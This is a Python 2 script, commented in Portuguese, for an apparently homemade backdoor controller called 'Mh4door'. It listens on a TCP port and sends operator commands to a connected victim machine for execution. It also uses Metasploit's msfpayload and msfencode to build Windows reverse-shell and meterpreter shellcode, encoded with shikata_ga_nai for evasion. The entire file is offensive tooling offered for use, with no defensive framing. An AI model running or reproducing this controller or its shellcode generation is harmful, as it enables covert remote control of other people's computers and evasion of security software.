#!/usr/bin/python
#coding: utf-8
from socket import *  
import sys
import os
import subprocess,re
#---------------------------------------
BOLD = '\033[1m'
BLUE = '\033[34m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
RED = '\033[91m'
ENDC = '\033[0m'
#--------------------------------------
HOST = '192.168.1.100'
porta = 2000            
versao = "1.0" 
#--------------------------------------
def shellcode_criar(payload,ip,porta,arquitetura,asm,jmp,eax,encode):
  #função que cria o shellcode
  nesster = "msfpayload %s LHOST=%s LPORT=%s R | msfencode -e %s/shikata_ga_nai -t c -a %s -b \%s\%s\%s -c %d C " % (payload,ip,porta,arquitetura,arquitetura,asm,jmp,eax,encode)
  print("{+ Gerando shellcode!}")
  proc = subprocess.Popen("%s" % (nesster), stdout=subprocess.PIPE, shell=True)
  data = proc.communicate()[0]
  #tratamento de strings 
  data = data.replace(";", "")
  data = data.replace(" ", "")
  data = data.replace("+", "")
  data = data.replace('"', "")
  data = data.replace("\n", "")
  data = data.replace("unsignedcharbuf[]=", "")
  data = data.rstrip()
  print("{+} shellcode criado com sucesso!\n")
  print data
#--------------------------------------
arquitetura = "x86"
asm = "x00"
jmp = "x0a"
eax = "x0d"
#--------------------------------------
#--------------------------------------
s = socket(AF_INET, SOCK_STREAM)
s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
s.bind((HOST, porta))
print "aguardando na porta :%s" % str(porta)
s.listen(10)
conn, addr = s.accept()
print 'conectado!', addr
print("""%s%s                                                                  
#--------------------------------------
 __  __ _    _  _      _                  
|  \/  | |  | || |    | |                 
| \  / | |__| || |_ __| | ___   ___  _ __ 
| |\/| | '_ \__   _/ _` |/ _ \ / _ \| '__|
| |  | | | | | | || (_| | (_) | (_) | |   
|_|  |_|_| |_| |_| \__,_|\___/ \___/|_|
                    versão:%s
                    copyright 2014%s"""%(GREEN,BOLD,versao,ENDC))
data = conn.recv(1024)
while 1:
#--------------------------------------
  command = raw_input("{+}>> ")
  mudar = command
#--------------------------------------
  if mudar == ":shellcode":
    print("{+} Iniciando Metasploit [OK]")
    ip = raw_input('[*] Digite o IP:')
    porta = raw_input('[*] Digite a porta:')
    encode = input("[=] Digite a quantidade de encoder metasploit:")
    #escolhendo o payload que sera executado na memoria
    print """
Payloads
========
Nome                                               Rank    Descriçao
----                                               ----    ---------
1.windows/meterpreter/reverse_tcp                 Normal  Payload  reverso tcp 
2.windows/shell/reverse_tcp                       Normal  Payload reverse cria uma conexão via shell CMD
3.windows/vncinject/reverse_tcp                   Normal  Payload cria um servidor vnc e retorna controle por interface
4.windows/x64/meterpreter/reverse_tcp             Normal  Payload proprio para windows 64 bits funciona em todas versões
"""
    carga = input(':>>>')
    if carga == 1:
      payload = 'windows/meterpreter/reverse_tcp'
    if carga == 2:
      payload = 'windows/shell/reverse_tcp'
    if carga == 3:
      payload = 'windows/vncinject/reverse_tcp'
    if carga == 4:  
      payload = 'windows/x64/meterpreter/reverse_tcp'
    shellcode_criar(payload,ip,porta,arquitetura,asm,jmp,eax,encode)
    command = raw_input("{+} Shell/shellcode:>> ")

#-------------------------------------- 
#  if mudar == ":Downloadexec":



#--------------------------------------
  conn.send(command)
#--------------------------------------
  if command == "sair": break
  data = conn.recv(1024)
  print data
conn.close()
#--------------------------------------